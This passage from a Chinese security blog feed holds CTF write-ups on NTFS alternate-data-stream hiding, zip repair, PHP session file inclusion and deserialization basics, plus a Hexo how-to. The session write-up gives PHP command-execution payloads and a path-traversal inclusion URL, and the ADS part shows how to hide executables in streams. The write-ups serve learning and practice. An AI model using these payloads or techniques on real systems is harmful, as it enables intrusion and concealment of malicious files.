normal file</code></p></li><li><p>使用<code>more</code>命令可以读取到隐藏的NTFS数据流</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_17-11-16.png" alt="PixPin_2025-05-20_17-11-16"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_17-14-39.png" alt="PixPin_2025-05-20_17-14-39"></p><p>已经成功的隐藏信息，查看方式有两种<br>一种是使用windows自带的more&#x2F;notepad查看，命令如下</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">more</span> &lt; <span class="hljs-keyword">test</span>.txt:hidden.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">notepad test.txt:hidden.txt<br></code></pre></td></tr></table></figure><p>第二种方法是使用工具（在后面列出）</p><p>关联文件流隐藏，不止可以隐藏文本数据，还可以隐藏其他的文件，比如exe可执行文件，pyc文件等。这里使用type命令，来隐藏文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> yincang.jpg &gt;suzhu.jpg:yincang.jpg#隐藏图片到另一张图片中<br>#查看方式使用windows自带的mspaint.exe<br>mspaint.exe suzhu.jpg:yincang.jpg<br></code></pre></td></tr></table></figure><table><thead><tr><th>操作</th><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>写入数据流</td><td><code>type yincang.jpg &gt; suzhu.jpg:yincang.jpg</code></td><td>把图片写入文件自身的隐藏流中</td></tr><tr><td>查看流是否存在</td><td><code>streams.exe suzhu.jpg</code> 或 <code>Get-Item -Path .\suzhu.jpg -Stream *</code></td><td>查看有哪些隐藏流</td></tr><tr><td>提取流为文件（最稳妥）</td><td>使用 PowerShell（见下）</td><td>推荐用于图片、ZIP、EXE 等二进制数据</td></tr><tr><td>打开隐藏图片</td><td>提取后用图片查看器打开</td><td>不建议直接用 <code>more</code> 读取图片</td></tr></tbody></table><p> 法 A：使用 <code>cmd</code> 提取到文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">more</span> &lt; yincang.jpg:suzhu.jpg &gt; extracted.jpg<br></code></pre></td></tr></table></figure><p>然后你就可以用图片查看器打开 <code>extracted.jpg</code> 了。</p><blockquote><p>⚠ 注意：<code>more</code> 会逐行读取文本，因此它处理 <strong>二进制数据可能出错</strong>，不太可靠，但对于某些小图片有效。</p></blockquote><p>使用 PowerShell 提取为字节流</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$fs</span> = [<span class="hljs-type">System.IO.File</span>]::Open(<span class="hljs-string">&quot;suzhu.jpg:yincang.jpg&quot;</span>, <span class="hljs-string">&#x27;Open&#x27;</span>, <span class="hljs-string">&#x27;Read&#x27;</span>)<br><span class="hljs-variable">$bytes</span> = <span class="hljs-built_in">New-Object</span> byte[] <span class="hljs-variable">$fs</span>.Length<br><span class="hljs-variable">$fs</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$fs</span>.Length) | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$fs</span>.Close()<br>[<span class="hljs-type">System.IO.File</span>]::WriteAllBytes(<span class="hljs-string">&quot;recovered.jpg&quot;</span>, <span class="hljs-variable">$bytes</span>)<br></code></pre></td></tr></table></figure><p>然后你就能用图片查看器打开 <code>extracted.jpg</code> 来查看隐藏的图片内容。</p><h2 id="检测NTFA-ADS的工具"><a href="#检测NTFA-ADS的工具" class="headerlink" title="检测NTFA-ADS的工具"></a>检测NTFA-ADS的工具</h2><p><a href="https://www.nirsoft.net/utils/alternate_data_streams.html">AlternateStreamView - View&#x2F;Copy&#x2F;Delete NTFS Alternate Data Streams</a></p><p>[Ntfs Streams Editor][<a href="https://files.cnblogs.com/files/rainbow7/ntfsstreamseditor.zip]">https://files.cnblogs.com/files/rainbow7/ntfsstreamseditor.zip]</a></p><p>[lads][ <a href="https://files.cnblogs.com/files/rainbow7/lads.zip]">https://files.cnblogs.com/files/rainbow7/lads.zip]</a></p><p>工具的使用在实战中介绍。</p><h2 id="CTF例题实战"><a href="#CTF例题实战" class="headerlink" title="CTF例题实战"></a>CTF例题实战</h2><p>找了几个NTFS流数据隐写的题目。</p><h3 id="ACTF新生赛2020-NTFS数据流"><a href="#ACTF新生赛2020-NTFS数据流" class="headerlink" title="[ACTF新生赛2020]NTFS数据流"></a>[ACTF新生赛2020]NTFS数据流</h3><p>题目地址：<a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]NTFS%E6%95%B0%E6%8D%AE%E6%B5%81">BUUCTF在线评测</a></p><p>下载完之后用WINRAR解压<code>flag.rar</code>（需要解压两次）</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-25-43.png" alt="PixPin_2025-05-23_18-25-43"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-23-08.png" alt="PixPin_2025-05-23_18-23-08"></p><p>打开解压缩后文件夹</p><p>筛选文件大小 看一下突出的293.txt</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-27-18.png" alt="PixPin_2025-05-23_18-27-18"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-29-34.png" alt="PixPin_2025-05-23_18-29-34"></p><p>提示<strong>ADS</strong>，用工具检测一下。</p><p>先用NtfsStreamsEditor，</p><p>在1中选文件再点2搜索。</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-43-38.png" alt="PixPin_2025-05-23_18-43-38"></p><p>直接双击打开异常的293.txt:flag.txt<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-39-30.png" alt="PixPin_2025-05-23_18-39-30"></p><p>得到flag <code>ACTF&#123;AAAds_nntfs_ffunn?&#125; </code></p><p>第二个使用NtfsStreamsEditor。</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-48-46.png" alt="PixPin_2025-05-23_18-48-46"></p><p>在这里选出要扫描的文件</p><p>双击筛选出来的<code>293.txt</code>,但是这个工具不能直接打开ADS</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_18-55-12.png" alt="PixPin_2025-05-20_18-55-12"></p><p>还需要我们输入命令查看内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">more</span> &lt; <span class="hljs-number">293</span>.txt:flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_19-03-00.png" alt="PixPin_2025-05-20_19-03-00"></p><p>需要注意的是</p><p><strong>解压需要使用winrar解压软件。涉及NTFS流的都需要Win RAR解压。</strong></p><h3 id="bugkuCTF-猫片-安恒-【图片隐写-NTFS-反编译】"><a href="#bugkuCTF-猫片-安恒-【图片隐写-NTFS-反编译】" class="headerlink" title="[bugkuCTF]猫片(安恒)【图片隐写+NTFS+反编译】"></a>[bugkuCTF]猫片(安恒)【图片隐写+NTFS+反编译】</h3><p> <img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-11-33.png" alt="PixPin_2025-05-23_19-11-33"></p><p>题目给了hint:LSB BGR NTFS</p><p>先在steg修改里看一下，文件头为PNG，saveBin</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-18-00.png" alt="PixPin_2025-05-23_19-18-00"></p><p>保存以后拉到010里面发现文件头不对，删掉<code>FF FE</code>,修改后缀为png，打开发现是一般二维码，丢到随波逐流修复宽高</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-26-18.png" alt="PixPin_2025-05-23_19-26-18"></p><p>看起来不太对劲顺便反个色</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-19-17.png" alt="PixPin_2025-05-23_19-19-17"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-22-27.png" alt="PixPin_2025-05-23_19-22-27"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-29-36.png" alt="PixPin_2025-05-23_19-29-36"></p><p>扫码结果是一个压缩包,下载后解压缩</p><p><img src="E:\temp\PixPin_2025-05-23_19-35-45.png" alt="PixPin_2025-05-23_19-35-45"></p><p>得到flag.txt用检测工具检测出来flag.pyc(是python编译后的文件)<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-39-14.png" alt="PixPin_2025-05-23_19-39-14"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-40-22.png" alt="PixPin_2025-05-23_19-40-22"></p><p>导出，在网站（<a href="https://tool.lu/pyc/">python反编译 - 在线工具</a>，编译后下载下来，这里还需要写一个解密脚本。</p><pre><code class="hljs">def decode(ciphertext):    # 恢复原始顺序    ciphertext = ciphertext[::-1]    flag = &#39;&#39;    for i, val in enumerate(ciphertext):        val = int(val)        if i % 2 == 0:            val -= 10        else:            val += 10        c = chr(val)        flag += chr(i ^ ord(c))    return flagciphertext = [    &#39;96&#39;,    &#39;65&#39;,    &#39;93&#39;,    &#39;123&#39;,    &#39;91&#39;,    &#39;97&#39;,    &#39;22&#39;,    &#39;93&#39;,    &#39;70&#39;,    &#39;102&#39;,    &#39;94&#39;,    &#39;132&#39;,    &#39;46&#39;,    &#39;112&#39;,    &#39;64&#39;,    &#39;97&#39;,    &#39;88&#39;,    &#39;80&#39;,    &#39;82&#39;,    &#39;137&#39;,    &#39;90&#39;,    &#39;109&#39;,    &#39;99&#39;,    &#39;112&#39;]print(decode(ciphertext))</code></pre><p>运行后得出 flag{Y@e_Cl3veR_C1Ever!}</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
      <category>实操</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NTFS数据隐写</tag>
      
      <tag>python反编译</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo fluid主题-添加分类及标签</title>
    <link href="/2025/04/24/Hexo-fluid%E4%B8%BB%E9%A2%98-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/"/>
    <url>/2025/04/24/Hexo-fluid%E4%B8%BB%E9%A2%98-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo-fluid主题-添加分类及标签"><a href="#Hexo-fluid主题-添加分类及标签" class="headerlink" title="Hexo fluid主题-添加分类及标签"></a>Hexo fluid主题-添加分类及标签</h1><h2 id="1-新建categories，tages页面"><a href="#1-新建categories，tages页面" class="headerlink" title="1.新建categories，tages页面"></a>1.新建categories，tages页面</h2><p><code>hexo new page categories</code><br>该命令在source目录下生成一个categories目录，categories目录下有一个index.md文件。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> page <span class="hljs-string">&quot;tags&quot;</span><br></code></pre></td></tr></table></figure><p>该命令在source目录下生成一个tages目录，目录下有一个index.md文件。</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-24_21-26-48.png" alt="PixPin_2025-04-24_21-26-48"></p><h2 id="2-在文章中添加标签"><a href="#2-在文章中添加标签" class="headerlink" title="2. 在文章中添加标签"></a>2. 在文章中添加标签</h2><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-24_21-27-48.png" alt="PixPin_2025-04-24_21-27-48"></p><p>需要注意缩进</p><p>tages为</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>-<span class="hljs-meta">%</span><span class="hljs-number">00</span> <br></code></pre></td></tr></table></figure><p>categories为</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>-<span class="hljs-meta">%</span><span class="hljs-number">00</span>[]<br></code></pre></td></tr></table></figure><p>如果不加中括号写多个categories会这样</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-24_20-59-20.png" alt="PixPin_2025-04-24_20-59-20"></p><p>保存以后</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">hexo g &amp;<span class="hljs-variable">&amp;hexo</span> d&amp;<span class="hljs-variable">&amp;hexo</span> cl<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>博客搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TGCTF ez_zip</title>
    <link href="/2025/04/24/TGCTF-ez-zip/"/>
    <url>/2025/04/24/TGCTF-ez-zip/</url>
    
    <content type="html"><![CDATA[<h1 id="TGCTF-ez-zip"><a href="#TGCTF-ez-zip" class="headerlink" title="TGCTF ez_zip"></a>TGCTF ez_zip</h1><p>前面就是正常爆破，已知明文攻击</p><p>结束后发现文件打不开 显示文件已损坏</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-22_21-25-37.png" alt="PixPin_2025-04-22_21-25-37"></p><p>修复压缩包得到flag</p><p>方法一：</p><p>题目是修改了文件名长度和压缩方式</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-22_21-51-07.png" alt="PixPin_2025-04-22_21-51-07"></p><p>flag.txt长度应为8,改回08 00</p><p>压缩方式从COMP_DEFLATE改成了COMP_STORED,但很明显文件是压缩过的,把这<br>两个地方修改</p><p>各种压缩方式</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_17-18-03.png" alt="PixPin_2025-04-23_17-18-03"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_17-18-25.png" alt="PixPin_2025-04-23_17-18-25"></p><p>第二种方法</p><p><strong>压缩源文件数据区</strong>和<strong>压缩源文件目录区</strong>在<strong>文件头标记后</strong>,除了压缩源文件目录区<br>多出一条压缩使用的版本 (2 bytes) ,即本题中重复出现的两次14 00,<strong>一直到文件名长度</strong><br>**08 00,都是保持一致的,**所以可以直接将压缩源文件数据区的十六进制数据复制填入压缩源<br>文件目录区表示文件名长度的08 00前即可</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_17-50-21.png" alt="PixPin_2025-04-23_17-50-21"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_17-52-29.png" alt="PixPin_2025-04-23_17-52-29"></p><p>第三种方法</p><p>因为没有加密压缩包,所以frData字段就是zlib压缩的内容，直接将这部分拿出来，加上zlib头 (789C)，zlib解压也可以得到flag</p><p> 为什么是这样？</p><p>📦 ZIP 中使用的压缩算法</p><p>ZIP 文件最常用的压缩方法编号为：</p><ul><li><code>0</code> → Store（无压缩）</li><li><code>8</code> → Deflate（zlib 同款压缩方式）</li></ul><p>当使用 Deflate 压缩时，ZIP 文件中的压缩数据其实就是 <strong>raw deflate 流</strong>，<strong>没有 zlib 头</strong>，因为 ZIP 协议自己管理了头部和校验信息。</p><p>那 zlib 是什么？</p><p><code>zlib</code> 是 Deflate 算法的封装。</p><ul><li>在 <code>zlib</code> 格式中，前两字节（通常是 <code>0x78 9C</code>）是头信息，说明压缩方式、窗口大小、校验方法等。</li><li>但是 ZIP 格式的文件数据不包含这个头，它只保存 <strong>纯 deflate 数据</strong>。</li></ul><p>🔧 所以要自己加上 zlib 头！</p><p>是的，如果你把 ZIP 文件里 <code>Local File Header</code> 后面的数据单独拿出来（压缩数据部分），它就是裸 deflate。</p><p>你只要：</p><ol><li><strong>加上 zlib header（比如 <code>0x78 9C</code>）</strong></li><li>然后用 <code>zlib.decompress()</code> 来解压</li></ol><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_18-08-42.png" alt="PixPin_2025-04-23_18-08-42"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-23_18-09-05.png" alt="PixPin_2025-04-23_18-09-05"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">78</span> <span class="hljs-number">9</span>C <span class="hljs-number">0</span>B <span class="hljs-number">71</span> <span class="hljs-number">77</span> <span class="hljs-number">0</span>E <span class="hljs-number">71</span> AB <span class="hljs-number">0</span>E <span class="hljs-number">4</span>F <span class="hljs-number">2</span>C <span class="hljs-number">2</span>A CA CC <span class="hljs-number">2</span>F <span class="hljs-number">8</span>A<br><span class="hljs-attribute">8F</span> CC <span class="hljs-number">2</span>F <span class="hljs-number">8</span>D CF <span class="hljs-number">48</span> <span class="hljs-number">2</span>C <span class="hljs-number">4</span>B <span class="hljs-number">8</span>D <span class="hljs-number">4</span>F <span class="hljs-number">49</span> <span class="hljs-number">4</span>D <span class="hljs-number">4</span>B <span class="hljs-number">4</span>D <span class="hljs-number">2</span>C <span class="hljs-number">49</span><br><span class="hljs-attribute">4D</span> <span class="hljs-number">89</span> <span class="hljs-number">2</span>F C9 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">4</span>F CF <span class="hljs-number">4</span>C CC <span class="hljs-number">2</span>B <span class="hljs-number">89</span> <span class="hljs-number">4</span>F <span class="hljs-number">29</span> <span class="hljs-number">4</span>A <span class="hljs-number">4</span>C<br><span class="hljs-attribute">CF</span> CF <span class="hljs-number">53</span> AC <span class="hljs-number">05</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>实操</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>压缩包修复</tag>
      
      <tag>TGCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>polarctf session文件包含</title>
    <link href="/2025/04/21/polarctf-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/04/21/polarctf-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="polarctf-session文件包含"><a href="#polarctf-session文件包含" class="headerlink" title="polarctf session文件包含"></a>polarctf session文件包含</h1><h2 id="Session文件包含漏洞"><a href="#Session文件包含漏洞" class="headerlink" title="Session文件包含漏洞"></a>Session文件包含漏洞</h2><p>当可以获取session文件路径并且session文件的内容可控的的时候，就可以通过包含session文件进行攻击</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>session文件包含的利用条件有两个：</p><ul><li>Session的存储位置可以获取</li><li>Session的内容可控</li></ul><p>一般通过以下两种方式获取session的存储位置：</p><ul><li><p>通过phpinfo的信息获取session的存储位置。<br>通过phpinfo的信息获取<code>session.save_path</code></p></li><li><p>通过猜测默认的session存储位置进行尝试<br>通常Linux中的Session的默认存储位置在<code>/var/lib/php/session</code>目录下</p></li><li><pre><code class="hljs">temp/session<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 示例分析</span></span><br><br>session文件包含代码如下<br><br>```php<br>session_start();<br><span class="hljs-meta prompt_">$</span><span class="language-bash">ctfs=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfs&#x27;</span>];</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>]=<span class="hljs-variable">$ctfs</span></span><br></code></pre></td></tr></table></figure></code></pre></li></ul><p>此代码可以通过GET型的ctfs参数传入。PHP代码将会获取的值存入到Session中。<br>攻击者可以利用ctfs参数将恶意代码写入到session文件中，然后在利用文件包含漏洞包含此session文件，向系统中传递恶意代码。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>上面的代码满足Session文件包含的两个要求</p><ul><li>PHP代码将会获取ctfs变量的值存入到session中</li><li>Session的默认 存储位置是&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</li></ul><p>访问URL：<code>http://www.abc.com/xxx/session.php?ctfs=a</code> 会在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session目录下降ctfs传入的值存储到session中<br>Session的文件名以sess_开头，后跟Sessionid，Sessionid可以通过开发者模式获取：<br>单击右键——检查——存储——Cookie——PHPSESSID 就可以找到内容</p><p>假设通过开发者模式获取到的sessionid的值为hufh7hsdf392eurh4,所以session的文件名为<code>sess_hufh7hsdf392eurh4</code></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过上面的分析，可以得知，向ctfs参数传入的内容会存储到session文件中。<br>如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到Session文件当中去，然后通过文件包含漏洞执行getshell</p><p>例如：访问代码<code>http://www.abc.com/xxx/session.php?ctfs=&lt;?php phpinfo();?&gt;</code>后，会在&#x2F;var&#x2F;lib&#x2F;php&#x2F;session目录下降ctfs的值写入session文件<br>session文件的内容为：<code>username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;</code>.</p><p><strong>攻击步骤</strong></p><ul><li>将恶意代码写入session文件</li><li>攻击者可以通过PHPinfo或者猜测到session存放的位置</li><li>通过开发者模式可以获得文件名称</li><li>通过本地文件包含漏洞可以解析session文件达到攻击的目的</li></ul><p>比如：<code>http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2</code></p><p><a href="https://www.cnblogs.com/Zeker62/p/15322771.html#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">✔PHP文件包含漏洞全面总结 - Zeker62 - 博客园</a></p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-13-32.png" alt="PixPin_2025-04-21_19-13-32"></p><p>利用php伪协议读取action.php</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-13-13.png" alt="PixPin_2025-04-21_19-13-13"></p><p>base64解码得到源码，跟session文件包含实例几乎一样</p><p>PHP代码将会获取POST型name变量的值存入到session中</p><p>利用开发者模式找到了session的值 msd07aqckf2mag1um8qtjapj50</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-35-39.png" alt="PixPin_2025-04-21_19-35-39"></p><p>访问代码<code>http://www.abc.com/temp/sess_xxxxx?</code>后，会在&#x2F;session目录下将name的值写入session文件 ,向系统中传递恶意代码。</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-50-28.png" alt="PixPin_2025-04-21_19-50-28"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">name=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-meta">?&gt;</span><br>name=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac flaggggg&#x27;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-21_19-59-03.png" alt="PixPin_2025-04-21_19-59-03"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>基础知识</category>
      
      <category>实操</category>
      
    </categories>
    
    
    <tags>
      
      <tag>polarctf</tag>
      
      <tag>session文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化基础</title>
    <link href="/2025/04/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/04/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="php反序列化基础"><a href="#php反序列化基础" class="headerlink" title="php反序列化基础"></a>php反序列化基础</h1><h2 id="什么是序列化，反序列化"><a href="#什么是序列化，反序列化" class="headerlink" title="什么是序列化，反序列化"></a>什么是序列化，反序列化</h2><p><strong>反序列化（Deserialization）</strong> 是指将<strong>序列化后的数据</strong>（通常是字符串或二进制格式）<strong>恢复为原始数据结构</strong>（如数组、对象）。在 PHP 中，<code>unserialize()</code> 就是用来执行反序列化的，它可以把 <code>serialize()</code> 处理过的字符串还原成原始的 PHP 变量或对象。</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 序列化对象</span><br><span class="hljs-variable">$data</span> = [<span class="hljs-string">&#x27;name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span> =&gt; <span class="hljs-number">25</span>];<br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;序列化后的数据: &quot;</span> . <span class="hljs-variable">$serialized</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-comment">// 反序列化</span><br><span class="hljs-variable">$unserialized</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$unserialized</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>输出</strong>： </p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">序列化后的数据: a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Alice&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">25</span>;&#125;<br><span class="hljs-built_in">Array</span><br>(<br>    [name] =&gt; Alice<br>    [age] =&gt; <span class="hljs-number">25</span><br>)<br></code></pre></td></tr></table></figure><p>这个过程就是：</p><ul><li><strong>序列化</strong>：把数组转换成字符串（便于存储、传输）。</li><li><strong>反序列化</strong>：把字符串恢复成数组（便于程序使用）。</li></ul><p>程序语言之所以需要<strong>序列化（Serialization）和反序列化（Deserialization）</strong>，主要是为了数据的存储、传输和共享。具体来说：</p><p>在应用开发中，数据往往需要持久化（如存入数据库、缓存或文件）。但数据库和文件通常存储的是字符串或二进制格式，<strong>序列化</strong>可以将复杂的数据结构（如对象、数组）转换为可存储的格式，之后用<strong>反序列化</strong>恢复出来。</p><p><strong>序列化 &#x3D; 把数据转换成字符串&#x2F;二进制（方便存储和传输）</strong></p><p><strong>反序列化 &#x3D; 把字符串&#x2F;二进制恢复成数据（方便程序使用）</strong></p><h2 id="PHP-序列化的代号与释义"><a href="#PHP-序列化的代号与释义" class="headerlink" title="PHP 序列化的代号与释义"></a>PHP 序列化的代号与释义</h2><table><thead><tr><th>代号</th><th>数据类型</th><th>释义</th><th>示例</th></tr></thead><tbody><tr><td><code>N</code></td><td><code>NULL</code></td><td>表示 <code>NULL</code> 值</td><td><code>N;</code></td></tr><tr><td><code>b</code></td><td><code>boolean</code></td><td>布尔值 